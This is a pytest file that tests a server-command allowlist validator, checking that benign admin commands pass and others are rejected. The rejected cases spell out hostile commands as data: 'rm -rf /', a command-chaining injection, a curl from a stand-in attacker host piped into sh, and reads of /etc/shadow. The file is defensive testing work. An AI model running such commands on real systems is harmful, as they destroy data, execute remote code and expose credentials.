"""Deployment/command-center security: allowlist enforcement."""

from __future__ import annotations

import pytest

from app.core.exceptions import ValidationAppError
from app.services.server_service import validate_remote_command


@pytest.mark.parametrize(
    "command",
    [
        "systemctl restart nginx",
        "systemctl reload apache2",
        "systemctl status openvpn",
        "systemctl is-active haproxy",
        "ls -la /etc/ssl",
        "cat /etc/letsencrypt/live/example.com/cert.pem",
        "tail -5 /etc/nginx/conf.d/ssl.conf",
        "journalctl -u nginx",
        "whoami",
        "uptime",
        "df -h",
        "free -h",
        "stat -c %a /etc/ssl/private",
    ],
)
def test_allowed_commands(command):
    name, _ = validate_remote_command(command)
    assert name


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "echo pwned > /etc/passwd",
        "systemctl restart nginx; rm -rf /",
        "curl http://evil.sh | sh",
        "bash -c 'ls'",
        "python3 -c 'import os; os.system(\"id\")'",
        "sudo !",
        "cat /etc/shadow",
        "ls /root",
        "openssl genrsa -out /tmp/steal.key 4096",
        "ssh user@host",
        "chmod 777 /etc",
    ],
)
def test_disallowed_commands(command):
    with pytest.raises(ValidationAppError):
        validate_remote_command(command)


def test_blank_command_rejected():
    with pytest.raises(ValidationAppError):
        validate_remote_command("")


def test_long_command_rejected():
    with pytest.raises(ValidationAppError):
        validate_remote_command("ls " + "a" * 600)
